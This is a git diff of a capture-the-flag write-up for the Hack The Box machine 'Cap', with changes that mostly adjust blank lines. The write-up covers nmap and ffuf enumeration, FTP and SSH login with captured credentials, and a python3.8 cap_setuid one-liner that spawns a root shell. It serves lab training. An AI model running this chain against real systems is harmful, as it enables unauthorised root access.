@@ -9,7 +9,8 @@ date: 2026-06-07
 2. OK! now check the HTB website and get the target IP and we are ready to startttt: 
    ![alt text](images/image.png)
 3. My first idea is doing some basic scans with this IP address. I always start this step with `Nmap`:
-```bash
+
+ ```bash
 nmap -sV --open <IP_ADDRESS>                      
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-06 04:38 +07
 Nmap scan report for <IP_ADDRESS>
@@ -32,6 +33,7 @@ I used the `-sV` flag to scan the version of services are running and `--open` f
 5. As we can see from the `nmap` scan result, the target IP address has port 80 (http) open. So, my next step is checking the website of this target IP address. 
 ![alt text](images/image-1.png)
 6. Another way to approach is trying to fuzzing web. `ffuf` is my favourite tool for web fuzzing/ enumeration. First, I ran the most basic scan in `ffuf` to find hidden url, directories:
+
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http:/
 /<IP_ADDRESS>/FUZZ -ic                                                                                           
@@ -64,6 +66,7 @@ capture                 [Status: 302, Size: 220, Words: 21, Lines: 4, Duration: 
                         [Status: 200, Size: 19386, Words: 8716, Lines: 389, Duration: 205ms]
 :: Progress: [87651/87651] :: Job [1/1] :: 169 req/sec :: Duration: [0:08:32] :: Errors: 0 ::
 ```
+
 OK! after the scanning process, we have something to discover: `data`, `ip` and `netstat`. But after checking the website, I could not find anything useful.
 
 7. My next step is checking more carefully the website and after a while, I see something interesting:
@@ -78,8 +81,8 @@ From the `nmap` scan result above, we know that the `FTP` port is opening. So, a
 ![alt text](images/image-6.png)
 We can see clearly the `username: Nathan` and the `password:` so we can try to login to FTP port.
 9. Login FTP and gain user key
-   
 With the password, I succesfully accessed Nathan's account and download `user.txt` file:
+
 ```bash
 ftp <IP_ADDRESS>
 Connected to <IP_ADDRESS>.
@@ -105,22 +108,28 @@ local: user.txt remote: user.txt
 ftp> exit
 221 Goodbye.
 ```
+
 Using simple `cat` command we can open the `user.txt` and find the `user key`:
+
 ```bash
 cat user.txt
 <USER_KEY>
 ```
+
 10. Privilege Escalation & try to gain the root key
    
    - Next step, I tried to login to `ssh` with nathan's account and it was successfull:
+
    ```bash
    ssh nathan@<IP_ADDRESS>
    nathan@<IP_ADDRESS>'s password: 
    Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
    nathan@cap:~$
    ```
+   
    - I tried to use `sudo -l` to check nathan's account permission but I could not find something: ```Sorry, user nathan may not run sudo on cap.```
    - So, next, I ued ```getcap -r /usr/ 2>/dev/null``` and I found the way to perform Privilege Escalation:
+
       ```bash
       getcap -r /usr/ 2>/dev/null
       /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
@@ -129,12 +138,14 @@ cat user.txt
       /usr/bin/mtr-packet = cap_net_raw+ep
       /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
       ```
+
       Explaination: 
       - `getcap` is the basic tool to scan and check file capabilities. Using `getcap` we can find what we can do with specific files.
       - The `getcap` `-r` flag allowed us to scan in `recursion` mode so we can scan widely.
       - `2>/dev/null` helps eliminate "Permission denied" error messages when scanning files you don't have permission to access.
       After the scanning process, I noticed the line: `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`. This line means in the file `/usr/bin/python3.8` user nathan can change user id (`cap_setuid`). We could perform Privilege Escalation in this way because we could change user_id to `0` which is the root's user_id
    - By using the command ```/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'``` I could set user_id to `0` and call a new shell with root privilege:
+
       ```bash
       nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
       root@cap:~# whoami
